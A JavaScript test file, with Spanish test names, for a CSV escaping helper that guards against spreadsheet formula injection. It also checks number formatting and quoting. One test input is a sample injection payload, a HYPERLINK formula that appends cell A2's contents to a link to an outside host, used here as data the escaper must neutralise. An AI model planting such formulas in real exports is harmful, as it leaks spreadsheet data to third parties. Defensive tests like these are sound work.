import { test } from 'node:test';
import assert from 'node:assert/strict';
import { esc, csvNum } from './csv.js';

test('una celda que parece fórmula se vuelve texto', () => {
  assert.equal(esc('=HYPERLINK("https://x.com"&A2;"Ver")'), `"'=HYPERLINK(""https://x.com""&A2;""Ver"")"`);
  assert.equal(esc('+54 9 11 1234-5678'), "'+54 9 11 1234-5678");
  assert.equal(esc('@SUM(A1:A9)'), "'@SUM(A1:A9)");
  assert.equal(esc('-2+3'), "'-2+3");
  assert.equal(esc('\t=1+1'), "'\t=1+1");
});

test('los números y los textos comunes no se tocan', () => {
  assert.equal(esc(csvNum(-12.5)), '-12,50');
  assert.equal(esc(csvNum(1234.5)), '1234,50');
  assert.equal(esc('Yerba Orgánica'), 'Yerba Orgánica');
  assert.equal(esc(null), '');
  assert.equal(esc(0), '0');
});

test('sigue entrecomillando lo que trae separador o comillas', () => {
  assert.equal(esc('a;b'), '"a;b"');
  assert.equal(esc('dijo "hola"'), '"dijo ""hola"""');
  assert.equal(esc('dos\nlíneas'), '"dos\nlíneas"');
});